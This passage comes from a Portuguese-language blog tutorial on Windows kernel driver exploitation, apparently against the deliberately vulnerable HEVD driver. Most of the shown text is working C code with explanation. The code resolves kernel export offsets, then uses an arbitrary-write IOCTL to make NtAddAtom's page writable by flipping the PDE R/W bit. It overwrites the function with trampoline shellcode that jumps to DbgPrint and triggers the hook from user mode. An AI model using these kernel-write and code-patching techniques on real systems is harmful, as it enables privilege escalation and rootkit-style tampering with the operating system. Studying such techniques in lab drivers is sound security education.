+<span class="line"><span style="color:#E1E4E8">ULONGLONG dbgprint_kernel </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (ULONGLONG)nt_base </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> dbgprint_offset;</span></span>
+<span class="line"><span style="color:#B392F0">printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Endereco do Kernel DbgPrint: 0x</span><span style="color:#79B8FF">%llx\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, dbgprint_kernel);</span></span></code></pre>
+<p>O método <code>GetKernelExportOffset</code> é bem direto:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#E1E4E8">ULONGLONG </span><span style="color:#B392F0">GetKernelExportOffset</span><span style="color:#E1E4E8">(HMODULE </span><span style="color:#FFAB70">user_copy</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> export_name</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">{</span></span>
+<span class="line"><span style="color:#E1E4E8">    ULONGLONG base </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (ULONGLONG)user_copy;</span></span>
+<span class="line"><span style="color:#F97583">    void*</span><span style="color:#E1E4E8"> export_addr </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">void*</span><span style="color:#E1E4E8">)</span><span style="color:#B392F0">GetProcAddress</span><span style="color:#E1E4E8">(user_copy, export_name);</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">export_addr)</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> (ULONGLONG)export_addr </span><span style="color:#F97583">-</span><span style="color:#E1E4E8"> base;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>Ele usa <code>GetProcAddress</code> para encontrar o endereço da função exportada na nossa cópia em modo usuário, e então subtrai o endereço base dessa cópia. O resultado é o offset relativo da função dentro do arquivo.</p>
+<p>Como os offsets são os mesmos tanto na cópia em modo usuário quanto no kernel real, podemos simplesmente somar esse offset ao endereço base do kernel que obtivemos anteriormente. Com isso, temos os endereços exatos de <code>NtAddAtom</code> e <code>DbgPrint</code> no kernel em execução.</p>
+<p>Agora que temos o endereço da <code>DbgPrint</code> no kernel, precisamos preencher nosso shellcode com esse endereço. Lembra que o gadget tinha aqueles bytes zerados esperando um endereço de 64 bits? É exatamente isso que vamos fazer agora:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#B392F0">memcpy</span><span style="color:#E1E4E8">(shellcode </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 2</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">&#x26;</span><span style="color:#FFAB70">dbgprint_kernel</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(dbgprint_kernel));</span></span></code></pre>
+<p>Essa linha copia o endereço de <code>DbgPrint</code> para dentro do shellcode, começando no byte 2, pulando os dois primeiros bytes que são a instrução <code>mov rax</code>. Com isso, nosso gadget fica completo: ele vai carregar o endereço da <code>DbgPrint</code> em <code>RAX</code> e dps vai saltar para lá.</p>
+<p>Mas tem um detalhe importante aqui. Quando sobrescrevermos os primeiros bytes da <code>NtAddAtom</code> com nosso shellcode, vamos destruir o código original da função. Se quisermos restaurar o comportamento normal depois (ou evitar deixar o sistema instável), precisamos salvar esses bytes antes de modificá-los.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#F97583">const</span><span style="color:#E1E4E8"> SIZE_T shellcode_size </span><span style="color:#F97583">=</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(shellcode);</span></span>
+<span class="line"><span style="color:#F97583">unsigned</span><span style="color:#F97583"> char</span><span style="color:#FFAB70"> original_bytes</span><span style="color:#E1E4E8">[shellcode_size];</span></span>
+<span class="line"><span style="color:#E1E4E8">ULONGLONG user_ntaddatom </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (ULONGLONG)user_copy </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> offset;</span></span>
+<span class="line"><span style="color:#B392F0">memcpy</span><span style="color:#E1E4E8">(original_bytes, (</span><span style="color:#F97583">void*</span><span style="color:#E1E4E8">)</span><span style="color:#FFAB70">user_ntaddatom</span><span style="color:#E1E4E8">, shellcode_size);</span></span></code></pre>
+<p>Aqui estamos fazendo exatamente isso: calculamos onde a <code>NtAddAtom</code> está localizada na nossa cópia em modo usuário (somando o offset ao endereço base da cópia) e copiamos os primeiros bytes dela para o array <code>original_bytes</code>.</p>
+<p>Esses bytes são importantes porque guardando-os, temos a opção de restaurar a <code>NtAddAtom</code> ao seu estado original depois de usarmos nosso trampolim, evitando deixar o sistema em um estado permanentemente corrompido.</p>
+<p>Agora lembra que eu disse que o endereço de <code>NtAddAtom</code> não tem permissão de escrita? Então, temos que alterar isso antes de conseguirmos sobrescrever a função com nosso shellcode.</p>
+<p>Para entender o que vamos fazer, precisamos falar rapidamente sobre como o Windows gerencia a memória através de estruturas chamadas Page Table Entries (PTEs).</p>
+<p>Cada região de memória no sistema tem entradas que descrevem suas permissões, e essas entradas são organizadas em uma hierarquia: PXE -> PPE -> PDE -> PTE.</p>
+<p>O que nos interessa aqui é o PDE (Page Directory Entry) da <code>NtAddAtom</code>. Essa estrutura contém, entre outras coisas, um bit que controla se a página é writable (gravável) ou read-only (somente leitura). No caso do código do kernel, por padrão esse bit está desligado, impedindo escritas.</p>
+<p>Para obter o endereço do PDE do <code>NtAddAtom</code>, eu por preguiça decidi usar o <a href="https://learn.microsoft.com/pt-br/windows-hardware/drivers/debugger/">WinDbg</a> anexando-o ao kernel localmente e executando os seguintes comandos:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>x nt!NtAddAtom</span></span>
+<span class="line"><span>!pte &#x3C;endereço de NtAddAtom></span></span></code></pre>
+<p><strong>INFO:</strong> Lembre-se de que é necessário ativar o modo de depuração para que isso funcione, já que precisamos nos anexar ao kernel. Para isso, execute o comando <code>bcdedit /debug on</code> e reinicie o computador.</p>
+<p>Isso vai retornar algo parecido com:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>PXE at FFFFC9E4F2793F80    PPE at FFFFC9E4F27F0080    PDE at FFFFC9E4FE010488    PTE at FFFFC9FC02091AB0</span></span>
+<span class="line"><span>contains 0000000005409063  contains 000000000550A063  contains 0A000000038000A1  contains 0000000000000000</span></span>
+<span class="line"><span>pfn 5409      ---DA--KWEV  pfn 550a      ---DA--KWEV  pfn 3800      --L-A--KREV  LARGE PAGE pfn 3956</span></span></code></pre>
+<p>O endereço que precisamos é justamente o PDE: <code>FFFFC9E4FE010488</code>. Copiamos esse valor e adicionamos ao nosso código:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>ULONGLONG ntaddatom_pde_addr = 0xFFFFC9E4FE010488ULL;</span></span></code></pre>
+<p>Com o endereço do PDE em mãos, agora podemos ler seu valor atual, modificá-lo para incluir a permissão de escrita, e depois usar nossa primitiva de escrita arbitrária para aplicar a mudança:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#6A737D">// Ler PDE original</span></span>
+<span class="line"><span style="color:#E1E4E8">ULONGLONG ntaddatom_pde_original </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> classe_tester.</span><span style="color:#B392F0">kernel_read</span><span style="color:#E1E4E8">(classe_tester.</span><span style="color:#B392F0">GetDeviceHandle</span><span style="color:#E1E4E8">(), ntaddatom_pde_addr);</span></span>
+<span class="line"><span style="color:#B392F0">printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] PDE original: 0x</span><span style="color:#79B8FF">%016llx\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, ntaddatom_pde_original);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// Tornar writable (setar bit R/W - bit 1)</span></span>
+<span class="line"><span style="color:#E1E4E8">ULONGLONG ntaddatom_pde_writable </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> ntaddatom_pde_original </span><span style="color:#F97583">|</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">2</span><span style="color:#F97583">ULL</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#B392F0">printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] PDE modificado (writable): 0x</span><span style="color:#79B8FF">%016llx\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, ntaddatom_pde_writable);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*] Modificando PDE para tornar NtAddAtom writable...</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">classe_tester.</span><span style="color:#B392F0">ArbitraryWrite</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#FFAB70">ntaddatom_pde_writable</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(ntaddatom_pde_writable), (PVOID)</span><span style="color:#FFAB70">ntaddatom_pde_addr</span><span style="color:#E1E4E8">)) {</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Falha ao modificar PDE</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>O que estamos fazendo aqui é bem direto: primeiro lemos o valor atual do PDE, depois fazemos um OR bit a bit com <code>0x2</code> (que ativa o bit de escrita), e finalmente usamos o <code>ArbitraryWrite</code> para sobrescrever o PDE com esse novo valor modificado.</p>
+<p>A partir desse momento, a página onde o <code>NtAddAtom</code> está localizada se torna gravável, e podemos finalmente sobrescrever seus primeiros bytes com nosso shellcode.</p>
+<p>Antes de prosseguir, precisei fazer uma modificação importante no método <code>ArbitraryWrite</code>. A versão anterior funcionava bem para escrever valores únicos, mas agora precisamos escrever um shellcode inteiro, byte por byte, no kernel. Para isso, a nova implementação ficou assim:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#E1E4E8">BOOL </span><span style="color:#B392F0">ArbitraryWrite</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#F97583"> void*</span><span style="color:#FFAB70"> data</span><span style="color:#E1E4E8">, SIZE_T </span><span style="color:#FFAB70">size</span><span style="color:#E1E4E8">, PVOID </span><span style="color:#FFAB70">base_addr</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">    const</span><span style="color:#F97583"> unsigned</span><span style="color:#F97583"> char*</span><span style="color:#E1E4E8"> bytes </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> reinterpret_cast</span><span style="color:#F97583">&#x3C;const</span><span style="color:#F97583"> unsigned</span><span style="color:#F97583"> char*></span><span style="color:#E1E4E8">(data);</span></span>
+<span class="line"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> (SIZE_T i </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">; i </span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8"> size; i </span><span style="color:#F97583">+=</span><span style="color:#79B8FF"> 8</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">        ULONGLONG qword </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        SIZE_T copy_size </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (i </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 8</span><span style="color:#F97583"> &#x3C;=</span><span style="color:#E1E4E8"> size) </span><span style="color:#F97583">?</span><span style="color:#79B8FF"> 8</span><span style="color:#F97583"> :</span><span style="color:#E1E4E8"> (size </span><span style="color:#F97583">-</span><span style="color:#E1E4E8"> i);</span></span>
+<span class="line"><span style="color:#B392F0">        memcpy</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">qword, bytes </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> i, copy_size);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">        char</span><span style="color:#FFAB70"> buf</span><span style="color:#E1E4E8">[</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#B392F0">        memset</span><span style="color:#E1E4E8">(buf, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">41</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(buf));</span></span>
+<span class="line"><span style="color:#F97583">        void*</span><span style="color:#E1E4E8"> what_ptr </span><span style="color:#F97583">=</span><span style="color:#F97583"> &#x26;</span><span style="color:#E1E4E8">qword;</span></span>
+<span class="line"><span style="color:#B392F0">        memcpy</span><span style="color:#E1E4E8">(buf, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">what_ptr, </span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">        PVOID where_addr </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (PVOID)((ULONGLONG)base_addr </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> i);</span></span>
+<span class="line"><span style="color:#B392F0">        memcpy</span><span style="color:#E1E4E8">(buf </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 8</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">where_addr, </span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">        DWORD bytesReturned </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        BOOL result </span><span style="color:#F97583">=</span><span style="color:#B392F0"> DeviceIoControl</span><span style="color:#E1E4E8">(</span></span>
+<span class="line"><span style="color:#E1E4E8">            hDevice,</span></span>
+<span class="line"><span style="color:#E1E4E8">            HEVD_IOCTL_ARBITRARY_WRITE,</span></span>
+<span class="line"><span style="color:#E1E4E8">            buf,</span></span>
+<span class="line"><span style="color:#F97583">            sizeof</span><span style="color:#E1E4E8">(buf),</span></span>
+<span class="line"><span style="color:#79B8FF">            NULL</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#79B8FF">            0</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#F97583">            &#x26;</span><span style="color:#E1E4E8">bytesReturned,</span></span>
+<span class="line"><span style="color:#79B8FF">            NULL</span></span>
+<span class="line"><span style="color:#E1E4E8">        );</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">result) {</span></span>
+<span class="line"><span style="color:#E1E4E8">            DWORD error </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetLastError</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#B392F0">            printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Falha ao escrever no offset </span><span style="color:#79B8FF">%zu</span><span style="color:#9ECBFF">: </span><span style="color:#79B8FF">%d</span><span style="color:#9ECBFF"> (0x</span><span style="color:#79B8FF">%X</span><span style="color:#9ECBFF">)</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, i, error, error);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> TRUE</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>A diferença aqui é que agora o método recebe um buffer de dados e seu tamanho, e então itera sobre esse buffer escrevendo <strong>8 bytes</strong> (um QWORD) por vez. Para cada iteração, ele calcula o offset correto no endereço de destino e usa a primitiva de escrita arbitrária para gravar aquele pedaço do shellcode.</p>
+<p>Com essa nova versão, podemos finalmente sobrescrever a <code>NtAddAtom</code> com nosso shellcode:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#B392F0">printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*] Escrevendo shellcode no kernel...</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">classe_tester.</span><span style="color:#B392F0">ArbitraryWrite</span><span style="color:#E1E4E8">(shellcode, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(shellcode), (PVOID)</span><span style="color:#FFAB70">ntaddatom_kernel</span><span style="color:#E1E4E8">)) {</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Falha ao escrever shellcode</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    classe_tester.</span><span style="color:#B392F0">ArbitraryWrite</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">ntaddatom_pde_original, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(ntaddatom_pde_original), (PVOID)ntaddatom_pde_addr);</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>Se a escrita do shellcode falhar por algum motivo, já restauramos o PDE imediatamente para evitar problemas.</p>
+<p>Assumindo que tudo deu certo, agora os primeiros bytes da <code>NtAddAtom</code> no kernel foram substituídos pelo nosso trampolim. Mas ainda não terminamos: precisamos restaurar as permissões da página de volta ao estado original para não deixar o código do kernel permanentemente gravável.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#B392F0">printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*] Restaurando PDE para Read-Only...</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">classe_tester.</span><span style="color:#B392F0">ArbitraryWrite</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#FFAB70">ntaddatom_pde_original</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(ntaddatom_pde_original), (PVOID)</span><span style="color:#FFAB70">ntaddatom_pde_addr</span><span style="color:#E1E4E8">)) {</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Falha ao restaurar PDE (PERIGO!)</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"><span style="color:#F97583">else</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] PDE restaurado!</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>Aqui estamos escrevendo de volta o valor original do PDE, removendo a permissão de escrita que havíamos adicionado.</p>
+<p>Neste ponto, a <code>NtAddAtom</code> está corrompida com nosso shellcode, mas a página voltou a ser read-only. Agora, sempre que alguém chamar <code>NtAddAtom</code>, em vez de executar a função original, o processador vai executar nosso trampolim que desvia para a <code>DbgPrint</code>.</p>
+<p>Agora vem a parte mais interessante, chamar nossa função corrompida. Para isso, precisamos chamar <code>NtAddAtom</code> a partir do modo usuário, e quando o processador tentar executá-la, vai acabar executando nosso shellcode que desvia para a <code>DbgPrint</code>.</p>
+<p>Primeiro, carregamos a <code>ntdll.dll</code> e obtemos o endereço da <code>NtAddAtom</code> exportada:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#E1E4E8">HMODULE ntdll </span><span style="color:#F97583">=</span><span style="color:#B392F0"> LoadLibraryA</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"ntdll.dll"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">typedef</span><span style="color:#B392F0"> NTSTATUS</span><span style="color:#E1E4E8">(NTAPI</span><span style="color:#F97583">*</span><span style="color:#FFAB70"> NtAddAtom_t</span><span style="color:#E1E4E8">)(PWSTR, ULONG, PVOID);</span></span>
+<span class="line"><span style="color:#79B8FF">NtAddAtom_t</span><span style="color:#E1E4E8"> pNtAddAtom </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">NtAddAtom_t</span><span style="color:#E1E4E8">)</span><span style="color:#B392F0">GetProcAddress</span><span style="color:#E1E4E8">(ntdll, </span><span style="color:#9ECBFF">"NtAddAtom"</span><span style="color:#E1E4E8">);</span></span></code></pre>
+<p>Em seguida, preparamos uma mensagem que queremos que seja impressa pelo <code>DbgPrint</code> no kernel:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#E1E4E8"> dbg_msg </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "Ei! Nao se esqueca de me seguir em github.com/Vith0r</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#B392F0">printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*] Invocando NtAddAtom para disparar DbgPrint...</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">pNtAddAtom</span><span style="color:#E1E4E8">((PWSTR)</span><span style="color:#FFAB70">dbg_msg</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span></code></pre>
+<p>Quando chamamos <code>pNtAddAtom</code>, o que acontece é bem legal, a chamada faz uma transição de modo usuário para modo kernel via <strong>syscall</strong>, e o processador tenta executar o código da <code>NtAddAtom</code>.</p>
+<p>Só que em vez do código original da função, ele encontra nosso shellcode <code>mov rax, &#x3C;endereço_DbgPrint>; jmp rax</code>, que carrega o endereço da <code>DbgPrint</code> em <strong>RAX</strong> e salta para lá. Com isso, o <code>DbgPrint</code> é executado recebendo nossa mensagem como argumento.</p>
+<p>Vale lembrar que essa mensagem não vai aparecer no console do nosso programa,
+mas sim no output do kernel debugger:</p>
+<p>![[Pasted image 20260422175637.png]]</p>
+<hr>
+<h3 id="considerações-finais">Considerações Finais<a aria-hidden="true" tabindex="-1" href="#considerações-finais"><span class="icon icon-link"></span></a></h3>
+<p><img src="https://www.youtube.com/watch?v=qEgppIzDPSk&#x26;t=696s" alt="video"></p>
+<p>Bom, para falar a verdade, foi bem difícil conseguir estudar tudo isso. Levei bastante tempo para conseguir escrever esse “artigo” e espero de verdade que você tenha gostado dele.</p>
+<p>Acho que não preciso, nesse ponto, estar explicando mais nada. Se você entendeu tudo até aqui, tem capacidade de completar todo o restante sozinho.</p>
+<p>Muito obrigado se você chegou até aqui. Espero que esse conteúdo tenha sido útil de alguma forma para seu aprendizado sobre segurança de drivers no Windows. Tchau tchau!</p>  </article> <div class="post__footer" data-astro-cid-jj6gr7j4> <div class="footer-grid" data-astro-cid-jj6gr7j4> <div class="footer-col" data-astro-cid-jj6gr7j4> <span class="footer-label" data-astro-cid-jj6gr7j4>Published</span> <span class="footer-value" data-astro-cid-jj6gr7j4> December 15, 2025 </span> <span class="footer-subtext" data-astro-cid-jj6gr7j4>22 min read • 4307 words</span> </div> <div class="footer-col" data-astro-cid-jj6gr7j4> <span class="footer-label" data-astro-cid-jj6gr7j4>Written By</span> <div class="footer-author" data-astro-cid-jj6gr7j4> <img class="footer-avatar" src="https://avatars.githubusercontent.com/u/124220594?v=4" alt="Vithor avatar" data-astro-cid-jj6gr7j4> <span class="footer-value" data-astro-cid-jj6gr7j4>Vithor</span> </div> </div> </div> </div> </article> </div> <script type="module" src="/assets/hoisted.js"></script> <script>(function(){const webAssetMap = {"drawing 2026-02-20 00.00.48.excalidraw 1.dkem-zja.png":"/_astro/Drawing 2026-02-20 00.00.48.excalidraw 1.DkeM-zja.png","drawing 2026-02-20 00.00.48.excalidraw 1.png":"/_astro/Drawing 2026-02-20 00.00.48.excalidraw 1.DkeM-zja.png","hytale-site.png":"/_astro/Hytale-site.WArzXDzQ.png","opocl8j.png":"/_astro/OPocl8J.DB4sm_Ju.png","pasted image 20260422174950.png":"/_astro/Pasted image 20260422174950.De5DijAk.png","pasted image 20260422174957.png":"/_astro/Pasted image 20260422174957.CLKWtQ_B.png","pasted image 20260422175306.png":"/_astro/Pasted image 20260422175306.DSgsY8-P.png","pasted image 20260422175329.png":"/_astro/Pasted image 20260422175329.B7LXNXbd.png","pasted image 20260422175412.png":"/_astro/Pasted image 20260422175412.BAng7CLU.png","pasted image 20260422175637.png":"/_astro/Pasted image 20260422175637.BW7lRa-0.png","pasted image 20260422175910.png":"/_astro/Pasted image 20260422175910.Bhdak3EL.png","pasted image 20260422175926.png":"/_astro/Pasted image 20260422175926.BDjP3UPN.png","pasted image 20260422180418.png":"/_astro/Pasted image 20260422180418.CHOMSox5.png","pasted image 20260422180434.png":"/_astro/Pasted image 20260422180434.DPCCixIR.png","anyrun-score.png":"/_astro/anyrun-score.DZZodPNl.png","c2-plugin-confirmation.png":"/_astro/c2-plugin-confirmation.D-Mg2rFb.png","c2-registration-beacon.png":"/_astro/c2-registration-beacon.aktermma.png","c2-tcp-connections.png":"/_astro/c2-tcp-connections.BjQ9zo7k.png","callback2_0_diagram.png":"/_astro/callback2_0_diagram.rlCLpWWO.png","classformat-error-duplicate.png":"/_astro/classformat-error-duplicate.BY8lZQFg.png","dll-injection-loop.png":"/_astro/dll-injection-loop.BFrvO5Ph.png","dllmain-to-beginthread.png":"/_astro/dllmain-to-beginthread.BabeDkB4.png","dllmain-to-createthread.png":"/_astro/dllmain-to-createthread.CfUkcik1.png","dmca-takedown-notice.png":"/_astro/dmca-takedown-notice.CHnmuelm.png","dynamic-api-resolution.png":"/_astro/dynamic-api-resolution.iyES2fPg.png","f2p-launcher-play-button.png":"/_astro/f2p-launcher-play-button.BZofspnP.png","gdip-dispose-breakpoint.png":"/_astro/gdip-dispose-breakpoint.BPyAOFhP.png","gdip-dispose-call-stack.png":"/_astro/gdip-dispose-call-stack.Cd1GIJSZ.png","gdiplus-steganography.png":"/_astro/gdiplus-steganography.BBZjfh_n.png","hytale-diagram-banner-3x.png":"/_astro/hytale-diagram-banner-3x.D9s6PuOs.png","hytale-game-running.png":"/_astro/hytale-game-running.D6qGXJpz.png","image-6.png":"/_astro/image-6.Cgr6oDif.png","image_paranoid.png":"/_astro/image_paranoid.BdhBf3mF.png","import-table-comparison.png":"/_astro/import-table-comparison.C2lEWbdu.png","inno-setup-stage2.png":"/_astro/inno-setup-stage2.DaUcjtEX.png","installer-comparison.png":"/_astro/installer-comparison.gzLwVWL7.png","integrity-verification-error.png":"/_astro/integrity-verification-error.P_3cswWq.png","invalid-digital-signature.png":"/_astro/invalid-digital-signature.rHxp6eSK.png","java-bytecode-dump.png":"/_astro/java-bytecode-dump.y3qZQxQT.png","j